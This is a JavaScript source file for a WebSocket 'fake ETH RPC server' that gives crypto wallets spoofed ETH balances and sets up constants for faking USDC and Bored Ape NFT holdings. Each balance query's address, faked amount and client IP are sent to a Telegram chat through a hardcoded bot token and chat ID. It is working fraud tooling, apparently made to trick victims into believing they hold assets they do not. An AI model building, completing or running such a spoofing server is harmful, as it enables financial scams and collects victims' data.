// merged_eth_nft_spoof_wss_only.js
// Fake ETH RPC server + ERC20 (USDC) + ERC721 (BAYC) spoof + Telegram panel + WSS-only

const { ethers } = require("ethers");
const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

// Persistent data
const DATA_DIR = '/data';
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
const BALANCES_JSON_FILE = path.join(DATA_DIR, 'balances.json');

// Load/save balances
const loadBalances = () => { try { if(fs.existsSync(BALANCES_JSON_FILE)) return JSON.parse(fs.readFileSync(BALANCES_JSON_FILE,'utf-8')); } catch(e){console.error(e);} return {}; };
const saveBalancesJSON = () => { try { fs.writeFileSync(BALANCES_JSON_FILE, JSON.stringify(spoofedBalances,null,2)); } catch(e){console.error(e);} };
let spoofedBalances = loadBalances();

// ETH_CALL interface
const BALANCE_CHECKER_ABI = ["function balances(address[] users, address[] tokens) view returns (uint256[])"];
const iface = new ethers.Interface(BALANCE_CHECKER_ABI);

// NFT/ERC20 spoof constants
const SPOOF_OWNER = '0x654467492CB23c05A5316141f9BAc44679EEaf8C';
const SPOOF_NFT_CONTRACT = '0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d'.toLowerCase();
const SPOOF_ERC20_CONTRACT = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'.toLowerCase();
const FAKE_BYTECODE = '0x6080604052348015600f57600080fd5b5060...';
function encodeUint256(n){ return '0x'+BigInt(n).toString(16).padStart(64,'0'); }
function encodeAddress(a){ return '0x'+a.toLowerCase().replace('0x','').padStart(64,'0'); }
function encodeBool(b){ return '0x'+(b? '1'.padStart(64,'0') : '0'.padStart(64,'0')); }

const now = ()=>new Date().toISOString().replace('T',' ').split('.')[0];

// Telegram config
const TELEGRAM_BOT_TOKEN = '8340660361:AAFDxBe2MS7RK3HLeXHRcER46nRCFIfaOFg';
const TELEGRAM_CHAT_ID = '7812677112';
const sendToTelegram = async (text)=>{ try{ await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { chat_id: TELEGRAM_CHAT_ID, text, parse_mode:'Markdown' }); } catch(e){console.error(e?.response?.data||e.message);} };

// Wallet detection placeholder for WSS (UA not available)
const detectWalletFromUA=(ua='')=>'Unknown';

// Convert hex wei to ETH
function weiHexToETH(hexWei) {
    if (!hexWei || typeof hexWei !== 'string') return '0';
    const hex = hexWei.toLowerCase().startsWith('0x') ? hexWei.slice(2) : hexWei;
    const wei = BigInt('0x'+hex);
    const decimals = 18n;
    const divisor = 10n**decimals;
    const whole = wei / divisor;
    const fraction = wei % divisor;
    let fractionStr = fraction.toString().padStart(Number(decimals), '0').replace(/0+$/,'');
    return fractionStr.length>0 ? `${whole.toString()}.${fractionStr}` : whole.toString();
}

// --- RPC handler ---
const handleRPC = (reqBody, ip='', ua='') => {
    const {method,params,id} = reqBody || {};
    const wallet = detectWalletFromUA(ua);

    if(method==='eth_chainId') return {jsonrpc:'2.0',id,result:'0x1'};
    if(method==='net_version') return {jsonrpc:'2.0',id,result:'1'};
    if(method==='eth_blockNumber') return {jsonrpc:'2.0',id,result:'0x100000'};
    if(method==='eth_syncing') return {jsonrpc:'2.0',id,result:false};

    if(method==='eth_getBalance'){
        const address = (params[0]||'').toLowerCase();
        const info = spoofedBalances[address];
        const balanceHex = info ? info.balance : '0x0';
        const balanceETH = weiHexToETH(balanceHex);
        const logMsg = `🕒 *${now()}*\n[+] Spoofing ETH for \`${address}\`\n🪙 Balance: \`${balanceETH} ETH\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
        console.log(logMsg); sendToTelegram(logMsg);
        return {jsonrpc:'2.0',id,result:balanceHex};
    }

    // Keep all your other RPC logic (eth_call, eth_getLogs, eth_getCode, etc.) unchanged

    return {jsonrpc:'2.0',id,result:null};
};

// --- WSS Server ---
const PORT = process.env.PORT || 8546;
const wss = new WebSocket.Server({ port: PORT });

wss.on('connection', ws => {
    console.log('🛰 New WebSocket connection');
    ws.on('message', message => {
        let reqBody;
        try { reqBody = JSON.parse(message.toString()); } catch(e){ return ws.send(JSON.stringify({jsonrpc:'2.0',id:null,result:null,error:'Invalid JSON'})); }
        const ip = ws._socket.remoteAddress;
        const ua = ''; // UA not available
        const response = handleRPC(reqBody, ip, ua);
        ws.send(JSON.stringify(response));
    });
});

console.log(`🚀 WSS-only Fake ETH+NFT+ERC20 RPC running at wss://0.0.0.0:${PORT}`);
